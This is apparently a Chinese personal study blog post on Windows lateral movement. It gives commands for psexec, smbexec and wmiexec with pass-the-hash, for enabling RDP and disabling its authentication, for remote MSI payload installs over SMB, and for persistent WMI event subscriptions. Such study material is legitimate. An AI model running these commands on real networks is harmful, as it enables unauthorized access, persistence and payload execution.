<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\192.168.1.131 -s cmd.exe</span><br></pre></td></tr></table></figure>



<h3 id="2-smbexec"><a href="#2-smbexec" class="headerlink" title="2.smbexec"></a>2.smbexec</h3><p><strong>无需先 ipc 链接</strong>,明文或 hash 传递（第三方库）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">smbexec uf9n1x/administrator:123qwe@192.168.1.131</span><br><span class="line">smbexec ./administrator:123qwe@192.168.1.131</span><br><span class="line">smbexec -hashes :$HASH$ ./admin@192.168.1.131</span><br><span class="line">smbbexec -hashes :$HASH$ domain/admin@192.168.1.131</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.1.131</span><br><span class="line">smbexec -hashes :ccef208c6485269c20db2cad21734fe7 uf9n1x/administrator@192.168.1.131</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38733448/1692341934355-b5f52992-4df7-4366-be92-eb43ebc7129e.png" alt="img"></p>
<h2 id="远程桌面调用"><a href="#远程桌面调用" class="headerlink" title="远程桌面调用"></a>远程桌面调用</h2><p>远程桌面协议（Remote Desktop Protocol，RDP）</p>
<p>查询注册表确定是否主机开启了远程桌面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections </span><br><span class="line"># 若字段值为0，则表示已启动RDP；若为1，则表示禁用RDP</span><br></pre></td></tr></table></figure>

<p>开启远程桌面:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 开启远程桌面 </span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f </span><br><span class="line"># 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权） </span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0  </span><br><span class="line"># 设置防火墙策略放行3389端口 </span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>

<p>对于远程主机，可以通过WMI来开启远程桌面功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /Node:192.168.1.131 /User:uf9n1x\Administrator /Password:123qwe@ RDTOGGLE WHRER ServerName=&#x27;win2008&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>

<h2 id="Sharp-RDP"><a href="#Sharp-RDP" class="headerlink" title="Sharp RDP"></a>Sharp RDP</h2><p><a target="_blank" rel="noopener" href="https://github.com/0xthirteen/SharpRDP">https://github.com/0xthirteen/SharpRDP</a></p>
<p>sharp rdp可以通过远程桌面协议在远程主机上执行系统命令，且不需要GUI客户端。</p>
<p>工具需要远程主机开启远程桌面功能，且防火墙放行3389端口</p>
<h2 id="WMI利用"><a href="#WMI利用" class="headerlink" title="WMI利用"></a>WMI利用</h2><p>WMI(Windows Management Instrumention,Windows管理规范)是一项核心的windows管理技术。用户可以通过WMI管理本地和远程主机。</p>
<p>Windows为传输WMI数据提供了两个可用的协议：分布式组件对象模型（Distributed Component Object Model, DCOM）和Windows远程管理（Window Remote Management，WinRM）使得WMI对象的查询、事件注册、WMI类方法的执行和类的创建等操作都能远程运行。</p>
<p>目前两种常见的利用方法:</p>
<p><strong>1、 通过调用WMI的类方法进行远程调用，如Win32_Process类中的Create方法可以在远程主机上创建进程，Win32_Product类的Install方法可以在远程主机上安装恶意的MSI</strong><br><strong>2、 远程部署WMI事件订阅，在特定事件发生时触发</strong></p>
<p>利用WMI进行横向移动需要具备以下条件：<br><strong>1、远程主机的WMI服务为开启状态（默认开启）</strong><br><strong>2、远程主机防火墙放行135端口，这是WMI管理的默认端口</strong></p>
<h3 id="1-常规利用方法"><a href="#1-常规利用方法" class="headerlink" title="1.常规利用方法"></a>1.常规利用方法</h3><h4 id="1-1执行远程查询"><a href="#1-1执行远程查询" class="headerlink" title="1.1执行远程查询"></a>1.1执行远程查询</h4><p>通过WMI查询远程主机上运行的进程信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.1.131 /user:Administrator /password:123qwe@ process list brief # /node 执行远程主机的地址</span><br></pre></td></tr></table></figure>

<p>一试就成功</p>
<h4 id="1-2创建远程进程"><a href="#1-2创建远程进程" class="headerlink" title="1.2创建远程进程"></a>1.2创建远程进程</h4><p>通过调用Win32_Process.Create方法在远程主机上创建进程，启动CMD来执行命令</p>
<p>由于WMIC在执行命令时没有回显，因此可以将执行结果写入文件，然后通过别的方式读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.1.131 /user:Administrator /password:123qwe@ process call create &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;</span><br></pre></td></tr></table></figure>

<h4 id="1-3远程安装MSI"><a href="#1-3远程安装MSI" class="headerlink" title="1.3远程安装MSI"></a>1.3远程安装MSI</h4><p>通过调用Win32_Product.Install方法，可以控制远程主机安装恶意MSI文件，从而获得权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.1.131 /user:Administrator /password:123qwe@ product call install PackageLocation=&quot;\\192.168.1.1\mysmb\reverse_tcp.msi&quot;</span><br></pre></td></tr></table></figure>



<h3 id="2-常见利用场景"><a href="#2-常见利用场景" class="headerlink" title="2.常见利用场景"></a>2.常见利用场景</h3><p>套件impacket-wmiexec</p>
<p>Impacket项目的Wmiexec.py能够以全交互或半交互的方式，通过WMI在远程主机上执行命令。该工机需要远程主机开启135和445端口，其中445端口用于传输命令执行的回显。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py uf9n1x/Administrator:123qwe@@192.168.1.131 </span><br><span class="line"></span><br><span class="line">wmiexec.exe ./administrator:123qwe@@192.168.1.131 &quot;whoami&quot; </span><br><span class="line">wmiexec.exe god/administrator:Admin12345@192.168.1.131 &quot;whoami&quot; </span><br><span class="line">wmiexec.exe -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.1.131 &quot;whoami&quot; </span><br><span class="line">wmiexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 uf9n1x/administrator@192.168.1.131 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>



<h3 id="3-WMI订阅事件的利用"><a href="#3-WMI订阅事件的利用" class="headerlink" title="3.WMI订阅事件的利用"></a>3.WMI订阅事件的利用</h3><p>WMI提供了强大的事件处理系统，几乎可以用于操作系统上发生的任何事件做出响应。</p>
<p>当创建某进程时，通过WMI事件订阅器来执行预先设置的脚本。</p>
<p>其中触发事件的具体条件被称为“<strong>事件过滤器</strong>”（Event Filter），如用户登录、新进程创建等；对指定事件发生做出相应的称为“<strong>事件消费者</strong>”（Event Consumer），包括一系列具体的操作，如运行脚本、记录日志、发送邮件等。</p>
<p>在部署事件订阅时，需要分别构建Filter和Consumer两部分，并将两者绑定在一起。</p>
<p>所有的事件过滤器都被存储在一个<strong>Root\subscription:__EventFiilter</strong>对象的实例，可以通过创建**__EventFilter对象<strong>实例来部署事件过滤器。事件消费者是基于</strong>ROOT\subscription:__EventConsumer系统类**派生来的类。</p>
<p>系统提供了常用的标准事件消费类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LogFileEventConsumer    # 将事件数据写入指定的日志文件 </span><br><span class="line">ActiveScriptEventConsumer  # 执行嵌入的VBScript或JavaScript </span><br><span class="line">NTEventLogEventConsumer      # 创建一个包含事件数据的事件日志条目 </span><br><span class="line">SMTPEventConsumer            # 发送一封包含事件数据的电子邮件 </span><br><span class="line">CommandLineEventConsumer     # 执行指定的系统命令</span><br></pre></td></tr></table></figure>

<p><strong>Sharp-WMIEvent</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/wh0Nsq/Sharp-WMIEvent">https://github.com/wh0Nsq/Sharp-WMIEvent</a></p>
<p>在远程主机上部署一个随即命名的永久事件订阅，并每隔60s执行以此SMB共享中的攻击载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 192.168.1.131 -Domain uf9n1x.com -Username Administrator -Password 123qwe@</span><br></pre></td></tr></table></figure>

<h2 id="DCOM利用"><a href="#DCOM利用" class="headerlink" title="DCOM利用"></a>DCOM利用</h2><p>Impacket里面的dcomexec.py脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./dcomexec.py domain/username:password@ip </span><br><span class="line">./dcomexec.py domain/username:password@ip &lt;command&gt;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://makura-zero.github.io">Makura</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://makura-zero.github.io/posts/3bd7ec5b.html">https://makura-zero.github.io/posts/3bd7ec5b.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://makura-zero.github.io" target="_blank">Makura's Gardon</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="https://s1.imagehub.cc/images/2023/03/17/9b7e4e06cd456edd71548a1d24a61748.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/f8ae000.html" title="burpsuite学习(更新中)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">burpsuite学习(更新中)</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.328888.xyz/2023/01/24/bVIKJ.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Makura</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Makura-zero"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://space.bilibili.com/1947350793?spm_id_from=333.337.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网安小菜鸡一枚!(≧∀≦)ゞ<br>有事b站私信( •̀ ω •́ )y</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">1.</span> <span class="toc-text">横向移动的文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%ABIPC"><span class="toc-number">1.1.</span> <span class="toc-text">1.文件共享IPC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B-IPC-%E5%B8%B8%E8%A7%81%E7%9A%84%E9%94%99%E8%AF%AF%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">建立 IPC 常见的错误代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B-IPC-%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.1.2.</span> <span class="toc-text">建立 IPC 失败的原因</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%90%AD%E5%BB%BASMB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">2.搭建SMB服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-windows%E8%87%AA%E5%B8%A6%E5%B7%A5%E5%85%B7"><span class="toc-number">1.3.</span> <span class="toc-text">3.windows自带工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Certutil"><span class="toc-number">1.3.1.</span> <span class="toc-text">Certutil</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BITSAdmin"><span class="toc-number">1.3.2.</span> <span class="toc-text">BITSAdmin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell"><span class="toc-number">1.3.3.</span> <span class="toc-text">powershell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#at-amp-schtask-amp-sc%E6%A8%AA%E5%90%91"><span class="toc-number">2.</span> <span class="toc-text">at&amp;schtask&amp;sc横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">1.利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-at%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.at计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-schtasks%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.3.</span> <span class="toc-text">3.schtasks计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-sc%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.4.</span> <span class="toc-text">4.sc服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E3%80%81%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.5.</span> <span class="toc-text">5.批量利用脚本、工具进行爆破连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">SMB协议使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-psexec"><span class="toc-number">3.1.</span> <span class="toc-text">1.psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-smbexec"><span class="toc-number">3.2.</span> <span class="toc-text">2.smbexec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%B0%83%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">远程桌面调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sharp-RDP"><span class="toc-number">5.</span> <span class="toc-text">Sharp RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">WMI利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.</span> <span class="toc-text">1.常规利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E6%9F%A5%E8%AF%A2"><span class="toc-number">6.1.1.</span> <span class="toc-text">1.1执行远程查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B"><span class="toc-number">6.1.2.</span> <span class="toc-text">1.2创建远程进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3%E8%BF%9C%E7%A8%8B%E5%AE%89%E8%A3%85MSI"><span class="toc-number">6.1.3.</span> <span class="toc-text">1.3远程安装MSI</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">6.2.</span> <span class="toc-text">2.常见利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-WMI%E8%AE%A2%E9%98%85%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">6.3.</span> <span class="toc-text">3.WMI订阅事件的利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCOM%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">DCOM利用</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/3bd7ec5b.html" title="横向移动基础"><img src="https://s1.imagehub.cc/images/2023/03/17/9b7e4e06cd456edd71548a1d24a61748.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="横向移动基础"/></a><div class="content"><a class="title" href="/posts/3bd7ec5b.html" title="横向移动基础">横向移动基础</a><time datetime="2023-07-01T03:00:04.000Z" title="发表于 2023-07-01 11:00:04">2023-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f8ae000.html" title="burpsuite学习(更新中)">burpsuite学习(更新中)</a><time datetime="2023-04-22T02:16:30.000Z" title="发表于 2023-04-22 10:16:30">2023-04-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/24e7e45c.html" title="webshell流量分析"><img src="https://s2.loli.net/2023/04/09/wUVmjrFxi8GAvqk.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="webshell流量分析"/></a><div class="content"><a class="title" href="/posts/24e7e45c.html" title="webshell流量分析">webshell流量分析</a><time datetime="2023-04-09T00:55:18.000Z" title="发表于 2023-04-09 08:55:18">2023-04-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f792595b.html" title="tomcat搭建">tomcat搭建</a><time datetime="2023-04-04T05:54:34.000Z" title="发表于 2023-04-04 13:54:34">2023-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/69b31f08.html" title="src技巧学习"><img src="https://s1.imagehub.cc/images/2023/03/17/9b7e4e06cd456edd71548a1d24a61748.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="src技巧学习"/></a><div class="content"><a class="title" href="/posts/69b31f08.html" title="src技巧学习">src技巧学习</a><time datetime="2023-03-16T06:46:19.000Z" title="发表于 2023-03-16 14:46:19">2023-03-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Makura</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>